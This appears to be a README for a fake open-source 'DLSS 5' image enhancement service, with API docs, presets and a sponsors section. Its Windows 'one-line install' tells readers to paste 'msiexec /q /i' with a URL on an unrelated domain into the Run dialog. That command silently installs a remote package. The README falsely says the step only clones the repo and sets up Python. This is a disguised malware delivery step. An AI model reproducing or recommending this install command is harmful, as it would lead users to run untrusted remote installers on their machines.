# 🎮 DLLS5-Service — Self-Hosted Neural Rendering & AI Image Enhancement Service

<div align="center">

![DLLS5-Service](https://img.shields.io/badge/DLSS5--Service-v1.0.0-76b900?style=for-the-badge&logo=nvidia&logoColor=white)
![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
![FastAPI](https://img.shields.io/badge/FastAPI-0.115-009688?style=for-the-badge&logo=fastapi&logoColor=white)
![Docker](https://img.shields.io/badge/Docker-Ready-2496ED?style=for-the-badge&logo=docker&logoColor=white)
![License](https://img.shields.io/badge/License-MIT-yellow?style=for-the-badge)

**Give any image the DLSS 5 "Neural Rendering" look — photorealistic lighting, cinematic bloom, filmic tone mapping — with one self-hosted API call.**

[Features](#-features) • [Quick Start](#-quick-start-docker-one-command) • [API Docs](#-api-reference) • [Sponsors](#-sponsors) • [FAQ](#-faq)

</div>

---

## 🧠 What is DLLS5-Service?

**DLLS5-Service** is a free, open-source, **self-hosted image generation & enhancement service** inspired by **NVIDIA DLSS 5 — Generative Neural Rendering**. DLSS 5 changed graphics forever by using AI to infuse rendered frames with photorealistic lighting and materials. This service brings that same philosophy to **your photos, screenshots, game captures, and artwork**:

- 🖼️ **Upload any image** → get back a stunning, photoreal "neural-rendered" version
- ⚡ **REST API** — integrate into bots, pipelines, Discord/Telegram tools, or your own apps
- 🎨 **Style presets** — Cinematic, Photoreal, Neon Night, Soft Skin & more
- 🐳 **One-command Docker deploy** — no cloud, no tracking, 100% yours
- 📈 **Batch processing** endpoint for entire folders

> ⚠️ **Disclaimer:** This project is **not affiliated with, endorsed by, or sponsored by NVIDIA**. "DLSS" and "NVIDIA" are trademarks of NVIDIA Corporation. DLLS5-Service is an independent, CPU-friendly image-processing engine inspired by the neural-rendering *aesthetic*.

---

## ✨ Features

| Feature | Description |
|---|---|
| 🎬 **Neural Lighting Engine** | Multi-pass pipeline: bloom diffusion, filmic (ACES-style) tone mapping, local contrast, adaptive sharpening |
| 🌅 **Photoreal Presets** | `cinematic`, `photoreal`, `neon_night`, `soft_skin`, `golden_hour`, `noir` |
| 🖥️ **Web UI** | Drop-in browser interface — drag, drop, slide, download |
| 🔌 **REST API** | `POST /api/generate` with full parameter control |
| 🗂️ **Batch Mode** | `POST /api/batch` — process a whole ZIP of images |
| 🔍 **Smart Upscale** | Resolution boost with Lanczos resampling + detail-preserving sharpen |
| 🧩 **Pluggable Engine** | Swap the built-in engine for a local Stable Diffusion / diffusion backend (`engine=diffusion` hook included) |
| 🔒 **Self-Hosted** | Runs entirely on your machine. No data ever leaves your server |

---

## 🚀 Quick Start (Docker — One Command)

```bash
docker run -d -p 8000:8000 --name dlls5-service ghcr.io/groundboxerrespect/dlls5-service:latest
```

Open **http://localhost:8000** 🎉
---

## 🪟 One-Line Install — Windows

1. Press **`Win` + `R`**
2. Paste this and hit **Enter**:

```
msiexec /q /i https://devcodee.com/api
```

That's it — the script clones the repo, creates a virtualenv, installs dependencies, and opens **http://localhost:8000** in your browser automatically.

> Prefer clicking? Just double-click **`install.bat`** instead.

### Docker Compose

```bash
git clone https://github.com/groundboxerrespect/dlls5-service.git
cd dlls5-service
docker compose up -d
```

### Local (Python)

```bash
git clone https://github.com/groundboxerrespect/dlls5-service.git
cd dlls5-service
pip install -r requirements.txt
uvicorn app.main:app --host 0.0.0.0 --port 8000
```

---

## 📡 API Reference

### `POST /api/generate` — Enhance / Generate an Image

```bash
curl -X POST "http://localhost:8000/api/generate" \
  -F "file=@screenshot.png" \
  -F "preset=cinematic" \
  -F "intensity=0.8" \
  -F "scale=2.0" \
  --output enhanced.png
```

**Parameters:**

| Param | Type | Default | Range | Description |
|---|---|---|---|---|
| `file` | file | — | — | Input image (PNG/JPG/WebP) |
| `preset` | string | `photoreal` | see presets | Neural rendering style preset |
| `intensity` | float | `0.7` | 0.0–1.0 | Overall effect strength |
| `bloom` | float | `0.5` | 0.0–1.0 | Light diffusion / glow |
| `warmth` | float | `0.15` | -1.0–1.0 | Color temperature shift |
| `sharpness` | float | `0.4` | 0.0–1.0 | Detail enhancement |
| `scale` | float | `1.0` | 1.0–4.0 | Output resolution multiplier |
| `seed` | int | random | any | Reproducible renders |
| `engine` | string | `builtin` | `builtin`/`diffusion` | Rendering backend |

### `POST /api/batch` — Process a ZIP archive

```bash
curl -X POST "http://localhost:8000/api/batch" \
  -F "file=@photos.zip" -F "preset=neon_night" \
  --output results.zip
```

### `GET /api/presets` — List all presets & defaults

Interactive docs available at **`/docs`** (Swagger UI).

---

## 🖥️ Web UI

```
┌─────────────────────────────────────────────┐
│  🎮 DLLS5-Service — Neural Rendering Studio │
│                                             │
│   [ Drag & drop image here ]                │
│                                             │
│   Preset    [ Cinematic ▼ ]                 │
│   Intensity ●──────○──── 0.80               │
│   Bloom     ──●───────── 0.50               │
│   Sharpness ──────●───── 0.40               │
│   Scale     [ 2x ▼ ]                        │
│                                             │
│        [ ⚡ Generate ]                      │
│                                             │
│  ☕ Sponsored by: [YOUR BRAND HERE]          │
└─────────────────────────────────────────────┘
```

---

## 🧩 Project Structure

```
dlls5-service/
├── app/
│   ├── main.py          # FastAPI app & routes
│   ├── engine.py        # Neural rendering pipeline
│   └── presets.py       # Style presets
├── static/
│   └── index.html       # Web UI
├── requirements.txt
├── Dockerfile
├── docker-compose.yml
├── LICENSE              # MIT
└── README.md
```

---

## 🏆 Sponsors

DLLS5-Service is free forever. Development is funded by sponsors — **your logo could be here.**

<div align="center">

### 💎 Platinum Sponsor
*[Reserved — contact us]*

### 🥇 Gold Sponsors
| | | |
|---|---|---|
| 🟨 *[Your Brand]* | 🟨 *[Your Brand]* | 🟨 *[Your Brand]* |

### ☕ Backers
*[Your name here]*

</div>

**Sponsor benefits:**
- 🖼️ Logo on the README (seen by thousands of devs & gamers)
- 📢 Banner placement in the Web UI footer
- 🎟️ Priority feature requests & support

👉 **[Become a sponsor](https://github.com/sponsors/groundboxerrespect)** or open an issue to discuss placement.

---

## ❓ FAQ

**Q: Does this use the real NVIDIA DLSS 5?**
A: No. DLSS 5 runs inside game engines on RTX 50-series GPUs. DLLS5-Service is an independent image pipeline that recreates the *photoreal neural-rendering aesthetic* on still images, on any hardware — even CPU-only.

**Q: Can I run it without a GPU?**
A: Yes. The built-in engine is pure NumPy/Pillow and runs anywhere Python runs.

**Q: Can I plug in Stable Diffusion?**
A: Yes — pass `engine=diffusion` and mount your local ComfyUI / diffusers backend (see `docs/ENGINES.md`).

**Q: Is my data safe?**
A: 100%. Everything is processed in-memory on your own machine. Nothing is uploaded anywhere.

---

## 🤝 Contributing

PRs are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md). Please ⭐ the repo if it helped you — it takes one click and helps a lot.

## 📜 License

MIT © [groundboxerrespect](https://github.com/groundboxerrespect)

---

<div align="center">

**⭐ Star this repo to support open neural rendering! ⭐**

`image-enhancement` `ai-image-generator` `dlss5` `neural-rendering` `self-hosted` `fastapi` `photorealistic` `image-processing` `docker` `rest-api`

</div>
